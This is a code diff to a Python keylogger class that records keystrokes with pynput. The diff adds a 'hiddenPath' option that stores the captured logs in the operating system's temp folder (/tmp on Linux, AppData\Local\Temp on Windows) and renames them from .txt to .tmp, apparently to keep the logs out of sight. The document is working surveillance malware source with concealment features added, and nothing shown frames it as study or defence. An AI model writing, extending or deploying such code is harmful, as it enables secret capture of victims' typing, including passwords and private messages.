@@ -1,13 +1,16 @@
 from datetime import datetime
 from threading import Timer
 from pynput.keyboard import Listener, Key
+from platform import system
+import os
 
 class Keylogger:
     def __init__(
         self,
         interval : int = 60,
         reportMethod : str = "file",
-        onlyOneFile : bool = False
+        onlyOneFile : bool = False,
+        hiddenPath : bool = False
     ):
         self.interval = interval
         self.reportMethod = reportMethod
@@ -16,6 +19,10 @@ class Keylogger:
         self.startDatetime = datetime.now()
         self.endDatetime = datetime.now()
         self._updateFilename()
+        self.hiddenPath = hiddenPath
+
+        if hiddenPath:
+            self.newPath = self._getNewPath()
     
     def start(self) -> None:
         self.startDatetime = datetime.now()
@@ -41,6 +48,16 @@ class Keylogger:
             self.log += specialKeys[key]
         else:
             self.log += str(key).replace("'","")
+
+    def _getNewPath(self) -> str:
+        currentOS = system()
+
+        if currentOS == "Linux":
+            return os.path.join("/","tmp")
+        elif currentOS == "Windows":
+            return os.path.join("C:","Users",os.getlogin(),"AppData","Local","Temp")
+
+        return ""
 
     def _report(self) -> None:
         """
@@ -72,10 +89,14 @@ class Keylogger:
         mode = "w"
         if self.onlyOneFile:
             mode = "a"
-        
-        with open(f"{self.fileName}.txt", mode) as f:
+
+        path = f"{self.fileName}.tmp"
+        if self.hiddenPath:
+            path = os.path.join(self.newPath, path)
+
+        with open(path, mode) as f:
             print(self.log, file=f)
-        print(f"[+] Saved {self.fileName}.txt")
+        print(f"[+] Saved {self.fileName}.tmp")
 
     def _updateFilename(self) -> None:
         """
@@ -87,6 +108,7 @@ class Keylogger:
 
 if __name__ == "__main__":
     Keylogger(
-        interval=5,
-        onlyOneFile=True
+        interval=10,
+        onlyOneFile=True,
+        hiddenPath=True
     ).start()
